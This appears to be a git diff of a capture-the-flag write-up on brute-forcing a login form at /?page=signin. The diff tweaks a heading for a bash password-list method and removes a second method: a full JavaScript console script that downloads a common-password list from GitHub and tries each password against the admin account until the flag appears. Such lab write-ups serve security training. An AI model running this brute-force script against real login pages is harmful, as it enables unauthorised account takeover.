@@ -20,7 +20,7 @@ The login form at `/?page=signin` is vulnerable to brute force attacks, allowing
 
 ## Exploitation Methods
 
-### **Method 1: Bash Script with Password List**
+### ** Bash Script with Password List**
 
 - Download a password list from GitHub:
   ```bash
@@ -39,108 +39,6 @@ The login form at `/?page=signin` is vulnerable to brute force attacks, allowing
   ```
 - Password `shadow` is found to work.
 
----
-
-### **Method 2: JavaScript in Google Chrome Console**
-
-1. Open the login page in Chrome.
-2. Open Developer Tools (F12), go to the **Console** tab.
-3. Paste and run this script (it fetches the same password list from GitHub and tries each password for you):
-
-   ```javascript
-   // URL to password list on GitHub
-   const passwordListUrl = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt';
-
-   // Format current time
-   const getCurrentTime = () => {
-     const now = new Date();
-     return now.toISOString().split('T')[0] + ' ' + now.toTimeString().split(' ')[0];
-   };
-
-   // Try a single password
-   async function tryPassword(password) {
-     try {
-       const timestamp = getCurrentTime();
-       console.log(`[${timestamp}] Testing: "${password}"`);
-       
-       const url = `index.php?page=signin&username=admin&password=${encodeURIComponent(password)}&Login=Login`;
-       const response = await fetch(url);
-       const html = await response.text();
-       
-       // Check for login success (no error image)
-       if (!html.includes('WrongAnswer.gif')) {
-         // Extract flag if present
-         const flagMatch = html.match(/The flag is : ([a-f0-9]+)/i);
-         const flag = flagMatch ? flagMatch[1] : 'Not found';
-         
-         console.log(`✅ SUCCESS! Password: "${password}", Flag: ${flag}`);
-         
-         // Display flag in a box
-         console.log(`
-   ┌${'─'.repeat(flag.length + 10)}┐
-   │  🚩 FLAG: ${flag}  │
-   └${'─'.repeat(flag.length + 10)}┘
-         `);
-         
-         return true;
-       }
-       return false;
-     } catch (error) {
-       console.log(`⚠️ Error with "${password}": ${error.message}`);
-       return false;
-     }
-   }
-
-   // Fetch passwords from GitHub
-   async function fetchPasswords() {
-     try {
-       console.log(`Fetching passwords from GitHub...`);
-       const response = await fetch(passwordListUrl);
-       
-       if (!response.ok) {
-         throw new Error(`Failed to fetch: ${response.status}`);
-       }
-       
-       const text = await response.text();
-       const passwords = text.split('\n')
-         .map(pwd => pwd.trim())
-         .filter(pwd => pwd.length > 0);
-       
-       console.log(`Fetched ${passwords.length} passwords`);
-       return passwords;
-     } catch (error) {
-       console.log(`Error fetching passwords: ${error.message}`);
-       // Fallback to some basic passwords if GitHub fetch fails
-       return ['admin', 'password', '123456', 'shadow', 'root'];
-     }
-   }
-
-   // Test all passwords with small delay
-   async function bruteForce() {
-     console.log(`Starting brute force attack at ${getCurrentTime()}...`);
-     
-     // Get passwords from GitHub
-     const passwords = await fetchPasswords();
-     
-     for (const password of passwords) {
-       // Add small delay to avoid overwhelming server
-       await new Promise(resolve => setTimeout(resolve, 30));
-       
-       // Stop if successful
-       if (await tryPassword(password)) {
-         break;
-       }
-     }
-     
-     console.log(`Brute force completed at ${getCurrentTime()}`);
-   }
-
-   // Start the brute force
-   bruteForce();
-
-   // Utility to test individual passwords
-   window.testPassword = (password) => tryPassword(password);
-   ```
 
 ---
 
